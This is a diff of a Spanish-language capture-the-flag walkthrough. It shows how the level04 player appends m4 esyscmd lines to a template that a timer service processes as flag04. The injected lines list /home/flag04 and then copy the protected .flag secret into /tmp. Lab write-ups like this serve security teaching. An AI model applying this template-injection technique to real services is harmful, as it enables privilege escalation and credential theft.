@@ -191,25 +191,44 @@ command -v m4
 m4 --version
 ```
 
-`esyscmd` no es otro programa: es una macro integrada en `m4`. Cuando `m4`
-encuentra una línea como esta:
+Ahora usaremos la macro `esyscmd` de `m4` para añadir a `template.m4` los
+comandos que necesitamos.
+
+`esyscmd` no es otro programa: cuando `m4` la
+encuentra en la plantilla, ejecuta el comando que contiene. Para realizar el
+ejercicio añadiremos líneas como esta:
 
 ```m4
 esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
 ```
 
-ejecuta `/bin/ls -la /home/flag04` mediante un shell. La salida se redirige al
-archivo indicado en `/tmp`; por tanto, al modificar la plantilla, `level04`
-puede hacer que el servicio ejecute comandos con los permisos de `flag04`.
-
-La salida de `cat` muestra que esta línea de reconocimiento ya está en
-`template.m4`. No la añadimos otra vez: esperamos a que el temporizador
-procese la plantilla y comprobamos después el archivo que genera.
+Esta línea ejecuta `/bin/ls -la /home/flag04` mediante un shell. La salida se
+redirige al archivo indicado en `/tmp`; por tanto, al modificar la plantilla,
+`level04` puede hacer que el servicio ejecute comandos con los permisos de
+`flag04`.
 
 
 ## 4. Reconocer el directorio de flag04
 
-Después de la siguiente ejecución del temporizador:
+La plantilla original no contiene todavía el comando de reconocimiento. Lo
+añadimos al final con `cat >>`; el bloque `<<'EOF'` escribe literalmente la
+línea hasta encontrar el segundo `EOF`:
+
+```bash
+cat >> /var/lib/babel/templates/template.m4 <<'EOF'
+esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
+EOF
+```
+
+Comprobamos que la línea se ha añadido ejecutando de nuevo:
+
+```bash
+cat /var/lib/babel/templates/template.m4
+```
+
+La línea queda guardada en la plantilla y se ejecutará cuando el temporizador
+procese el archivo como `flag04`. Hay que esperar a la siguiente ejecución del
+temporizador antes de consultar el resultado:
 
 ```bash
 systemctl status babel.service --no-pager
@@ -222,9 +241,6 @@ cat /tmp/babel_flag04_listing.txt
 propietario y tamaño.
 `cat` lee el listado que el comando `/bin/ls -la /home/flag04`, incluido en la
 plantilla, ha guardado en ese archivo.
-
-El archivo se crea durante el procesamiento de Babel, por lo que hay que
-esperar al siguiente ciclo del temporizador antes de leerlo.
 
 El listado reveló el archivo protegido:
 
@@ -241,23 +257,37 @@ La ruta del secreto es:
 
 ## 5. Extraer la credencial
 
-La plantilla ya contiene una línea que lee `.flag` como `flag04` y guarda el
-resultado en `/tmp/level04_flag.txt`:
+Ahora que conocemos la ruta de `.flag`, añadimos una segunda línea a la
+plantilla para leerla como `flag04` y guardar el resultado:
 
 ```m4
 esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
 ```
 
-`babel` la procesa en el siguiente ciclo del temporizador y ejecuta `cat` con
-los permisos de `flag04`. Tras esa ejecución:
+```bash
+cat >> /var/lib/babel/templates/template.m4 <<'EOF'
+esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
+EOF
+```
+
+Comprobamos que la línea se ha añadido consultando las últimas líneas de la
+plantilla:
+
+```bash
+tail -n 15 /var/lib/babel/templates/template.m4
+```
+
+En el siguiente ciclo del temporizador, `babel` procesa la línea y ejecuta
+`cat` con los permisos de `flag04`. Después comprobamos y leemos el archivo
+generado:
 
 ```bash
 ls -l /tmp/level04_flag.txt
 cat /tmp/level04_flag.txt
 ```
 
-El primer payload de reconocimiento permanece en la plantilla; el segundo
-payload se ejecuta después y escribe la flag en `/tmp/level04_flag.txt`.
+La primera línea de reconocimiento permanece en la plantilla; la segunda línea
+se ejecuta después y escribe la flag en `/tmp/level04_flag.txt`.
 
 La credencial obtenida fue:
 
